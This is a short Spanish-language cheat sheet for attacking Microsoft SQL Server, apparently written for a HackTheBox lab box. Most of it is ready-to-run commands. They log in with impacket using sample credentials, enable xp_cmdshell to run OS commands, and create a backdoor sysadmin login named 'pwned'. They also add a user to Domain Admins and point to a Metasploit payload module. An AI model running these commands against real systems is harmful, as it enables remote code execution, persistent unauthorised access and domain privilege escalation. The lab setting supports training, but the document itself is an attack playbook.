# MICROSOFT SQL SERVER ATTACKS

- Cuando logramos comprometer credenciales de un usuario de SQL Server, podemos realizar ataques adicionales para obtener acceso a la base de datos o ejecutar comandos en el servidor SQL.

## Vectores de ataque

- **SQL Injection**: Si la aplicación web es vulnerable a inyecciones SQL, podemos utilizar esta vulnerabilidad para ejecutar comandos SQL arbitrarios y obtener acceso a la base de datos.

- **SQLCMD**: Herramienta de línea de comandos para interactuar con SQL Server. Permite ejecutar consultas SQL y scripts.

- **xp_cmdshell**: Procedimiento almacenado que permite ejecutar comandos del sistema operativo desde SQL Server. Si está habilitado, podemos ejecutar comandos de Windows directamente desde SQL Server.

### Acceso mediante impacket e intento de RCE

- `impacket-mssqlclient manager.htb/operator:operator@manager.htb -windows-auth`
- Enumerar directorios: `SQL (MANAGER\Operator  guest@master)> xp_dirtree`

#### Habilitar xp_cmdshell
- `EXEC sp_configure 'show advanced options', 1;`
- `RECONFIGURE;`
- `EXEC sp_configure 'xp_cmdshell', 1;`
- `RECONFIGURE;`
- Entonces ahora: `EXEC xp_cmdshell 'whoami';`

#### Crear persistencia en MSSQL
- Crear un nuevo usuario con privilegios:
    ```sql
    CREATE LOGIN [pwned] WITH PASSWORD = 'pass';
    CREATE USER [pwned] FOR LOGIN [pwned];
    EXEC sp_addsrvrolemember 'pwned', 'sysadmin';
    ```
- Verificar el acceso:
    ```sql
    SELECT SYSTEM_USER, USER_NAME();
    ```
- `EXEC xp_cmdshell 'net group "Domain Admins" manager\operator /add /domain';`


#### Herramientas utiles
- Impacket
- PowerUpSQL
- Metasploit `exploit/windows/mssql/mssql_payload`